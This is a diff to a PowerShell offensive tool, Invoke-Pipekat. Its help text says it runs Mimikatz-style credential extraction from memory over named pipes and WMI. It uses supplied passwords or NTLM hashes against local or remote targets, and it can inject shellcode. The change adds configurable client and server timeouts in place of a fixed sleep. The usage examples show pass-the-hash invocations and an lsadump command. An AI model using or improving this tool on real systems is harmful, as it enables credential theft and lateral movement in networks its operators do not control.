@@ -6,7 +6,7 @@ The Invoke-Pipekat module uses Named Pipes and WMI to extract credentials using 
 
 .DESCRIPTION
 
-When you are running as a low-level user but have obtained highly privileged credntials and you want to extract credentials from memory or use any of the features of the famous tool from @gentilkiwi without touching disk or loading from an external source. This uses named pipes to communicate between process and then uses WMI to elevate up on the localhost using the supplied credentials. Default timeout 30seconds.
+When you are running as a low-level user but have obtained highly privileged credntials and you want to extract credentials from memory or use any of the features of the famous tool from @gentilkiwi without touching disk or loading from an external source. This uses named pipes to communicate between process and then uses WMI to elevate up on the localhost using the supplied credentials. Default timeout 30 seconds for the clinet pipe and 600 seconds for the server pipe.
 
 .EXAMPLE
 
@@ -26,12 +26,14 @@ Invoke-Pipekat -Username Admin -Hash 4E3254E32556AE56AE -Domain . -Command "lsad
 
 .EXAMPLE
 
-Invoke-Pipekat -Target 10.0.0.1 -Username Admin -Hash 4E3254E32556AE56AE -Domain . -Shellcode ZnVuY3Rpb24gSW52b2tlL -TimeoutMS 15000
+Invoke-Pipekat -Target 10.0.0.1 -Username Admin -Hash 4E3254E32556AE56AE -Domain . -Shellcode ZnVuY3Rpb24gSW52b2tlL -Timeout 15 -TimeoutServer 900
 
 #>
-param($Command, $Username, $Password, $Domain, $Hash, $Target, $Shellcode, [bool]$PSexec = $False, $TimeoutMS)
+param($Command, $Username, $Password, $Domain, $Hash, $Target, $Shellcode, [bool]$PSexec = $False, $Timeout, $TimeoutServer)
 
-if(!$TimeoutMS) {$TimeoutMS = 30000}
+
+if(!$TimeoutServer) {$TimeoutServer = 600}
+if(!$TimeoutMS) {$TimeoutMS = 300000} else {$TimeoutMS = $Timeout * 1000}
 if(!$Username) {echo "No username supplied...."; return}
 if(!$Domain) {echo "No domain supplied...."; return}
 if((!$Password) -and (!$Hash)) {echo "No password/hash supplied...."; return}
@@ -142,7 +144,7 @@ function Encrypt-String
 add-Type -assembly "System.Core"
 `$t = start-job -ScriptBlock `$scriptblock -ArgumentList @(`$pipeName,`$Payload)
 `$pi = new-object System.IO.Pipes.NamedPipeClientStream(".", `$pipeName);
-Start-Sleep 240
+Start-Sleep $TimeoutServer
 `$t.StopJob()
 "@
 
@@ -253,7 +255,7 @@ add-Type -assembly "System.Core"
 `$t = start-job -ScriptBlock `$scriptblock -ArgumentList @(`$pipeName, `$pipemimi)
 `$pl = new-object System.IO.Pipes.NamedPipeClientStream(".", `$pipeName);
 `$pp = new-object System.IO.Pipes.NamedPipeClientStream(".", `$pipemimi);
-Start-Sleep 240
+Start-Sleep $TimeoutServer
 `$t.StopJob()
 
 "@
@@ -397,7 +399,7 @@ $pipekat = @"
 add-Type -assembly "System.Core"
 `$t = start-job -ScriptBlock `$scriptblock -ArgumentList @(`$pipeName)
 `$pi = new-object System.IO.Pipes.NamedPipeClientStream(".", `$pipeName);
-Start-Sleep 240
+Start-Sleep $TimeoutServer
 `$t.StopJob()
 "@
 
